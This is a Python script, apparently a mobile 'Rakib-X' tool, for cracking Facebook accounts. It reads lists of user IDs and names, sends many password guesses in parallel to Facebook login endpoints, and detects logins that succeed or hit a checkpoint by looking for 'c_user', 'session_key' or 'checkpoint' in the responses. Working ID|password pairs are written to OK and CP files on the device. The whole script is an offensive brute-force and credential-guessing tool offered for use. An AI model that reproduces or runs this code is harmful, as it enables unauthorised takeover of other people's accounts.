...
logo=("""\033[1;32m ____       _    _ _               
\033[1;33m |  _ \ __ _| | _(_) |__      __  __
\033[1;34m | |_) / _` | |/ / | '_ \ ____\ \/ /
\033[1;35m |  _ < (_| |   <| | |_) |_____>  < 
\033[1;36m |_| \_\__,_|_|\_\_|_.__/     /_/\_\ 
\033[0;94mâ•”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•—\033[1;33m 
â• â•â•[Author                   â€¢ \33[1;38mRAKIBUL ISLAM\33[1;38m  â•‘\033[1;31m 
â• â•â•[Facebook                 â€¢ RAKIBUL ISLAM  â•‘  \033[1;97m  
â• â•â•[Github                   â€¢ \33[1;38mRAKIB-X        â•‘\33[1;34m   
â• â•â•[Whatsapp                 â€¢ 00000000000    â•‘\33[1;35m 
â• â•â•[TOOLS                    â€¢ FREEðŸ”¥         â•‘ \33[1;32m   
â• â•â•[VERSION                  â€¢ 2.0            â•‘\033[1;35m 
...
def public():
        ...
        linex()
        print(' \033[1;31m[1] Method 1 (for new ids) \033[1;32m\n [2] Method 2 (for old ids)\033[1;33m\n [3] Method 3 (for old ids)\033[1;31m')
        linex()
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                clear()
                                print(' \033[1;35mPut file example:  /sdcard/File.txt  etc..\033[1;35m')
                                linex()
                                file = input(' \033[1;36mPut file path\033[1;36m: ')
                                try:
                                ...
                                plist = []
                                try:
                                        ps_limit = int(input(' \033[1;34mHow many passwords do you want to add ? '))
                                except:
                                        ps_limit =1
                                linex()
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(' \033[1;34mTotal account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
                                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [Rakib-X-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [Rakib-X-OK] %s | %s'%(ids,pas))
                                open('/sdcard/Rakib-X-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [Rakib-X-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Rakib-X-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [Rakib-X-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Rakib-X-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [Rakib-X-] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/Rakib-X-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [Rakib-X-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/Rakib-X-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [Rakib-X-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ð˜¼ð™†ð˜¼ð™Žð™ƒ-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
